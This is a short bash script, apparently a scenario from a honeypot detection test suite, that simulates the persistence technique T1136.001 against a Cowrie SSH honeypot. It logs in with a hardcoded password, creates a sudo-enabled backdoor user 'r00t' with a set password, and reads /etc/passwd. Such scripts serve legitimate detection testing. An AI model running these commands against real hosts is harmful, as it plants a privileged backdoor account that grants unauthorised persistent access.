#!/usr/bin/env bash
# S16 — New Local User Creation
# Tactic : Persistence (TA0003)
# Technique: T1136.001 Create Account: Local Account
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S16 New Local User — ${TARGET} ==="
# Send user-creation commands (logged by Cowrie even if Cowrie's useradd prompts and exits)
timeout ${TIMEOUT:-10} $SSH "useradd -m -s /bin/bash r00t 2>&1; echo 'r00t:P@ssw0rd123' | chpasswd 2>&1; usermod -aG sudo r00t 2>&1" 2>/dev/null || true
# Verification exec always succeeds — confirms honeypot is alive and responding
timeout ${TIMEOUT:-10} $SSH "cat /etc/passwd | tail -3; exit 0" && echo "[OK]" || echo "[FAIL]"
